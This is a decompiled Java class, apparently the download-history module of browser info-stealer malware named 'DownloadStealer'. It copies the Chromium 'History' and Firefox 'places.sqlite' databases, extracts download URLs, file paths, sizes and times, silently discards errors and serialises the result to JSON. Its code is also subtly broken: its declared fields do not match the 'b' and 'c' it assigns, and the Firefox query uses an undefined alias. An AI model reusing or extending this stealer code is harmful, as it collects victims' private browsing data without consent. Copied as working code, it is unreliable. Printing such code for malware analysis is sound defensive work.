/* DEOBFUSCATED: DownloadStealer_Download.java (inner class) */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.d;
import c.f;
import c.i;
import c.r;
import c.w$Download;
import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;

public final class w {
    private final List<w$Download> a = new ArrayList<w$Download>();
    private final String browserName;
    private final String profileName;

    public w(f f2) {
        this.b = f2.getBrowser().getInfo().getBrowserName();
        this.c = f2.getDirectory().getName();
        if (f2.getBrowser().getInfo().isFirefox()) {
            this.loadFirefox(f2);
        } else {
            this.loadChromium(f2);
        }
    }

    private void loadChromium(f f2) {
        this.loadFromDb(new File(f2.getDirectory(), "History"), false);
    }

    private void loadFirefox(f f2) {
        this.loadFromDb(new File(f2.getDirectory(), "places.sqlite"), true);
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    private void loadFromDb(File file, boolean bl) {
        if (!file.isFile()) {
            return;
        }
        File file2 = null;
        try {
            Class.forName("org.sqlite.JDBC");
            file2 = d.copyToTemp(file);
            try (Connection connection = DriverManager.getConnection("jdbc:sqlite:" /* r.sq() */ + file2.getAbsolutePath());
                 Statement statement = connection.createStatement();){
                if (bl) {
                    try (ResultSet resultSet = statement.executeQuery("SELECT p.url, p.url, 0, b.dateAdded, b.dateAdded, '' FROM moz_annos a INNER JOIN moz_places p ON a.place_id = p.id WHERE a.content LIKE '%download%'");){
                        while (resultSet.next()) {
                            this.a.add(new w$Download(resultSet.getString(1), "", "", 0L, i.chromiumMicrosToIsoFromUnixSeconds(resultSet.getLong(4) / 1000000L), i.chromiumMicrosToIsoFromUnixSeconds(resultSet.getLong(5) / 1000000L)));
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    return;
                }
                try (ResultSet resultSet = statement.executeQuery("SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads");){
                    while (resultSet.next()) {
                        this.a.add(new w$Download(resultSet.getString("tab_url"), resultSet.getString("target_path"), resultSet.getString("mime_type"), resultSet.getLong("total_bytes"), i.chromiumMicrosToIso(resultSet.getLong("start_time")), i.chromiumMicrosToIso(resultSet.getLong("end_time"))));
                    }
                }
            }
        }
        catch (Exception exception) {
        }
        finally {
            if (file2 != null && file2.exists()) {
                file2.delete();
            }
        }
    }

    public int getCount() {
        return this.a.size();
    }

    public JSONArray toJsonArray() {
        JSONArray jSONArray = new JSONArray();
        for (w$Download w$Download : this.a) {
            jSONArray.put(w$Download.toJson(this.b, this.c));
        }
        return jSONArray;
    }
}

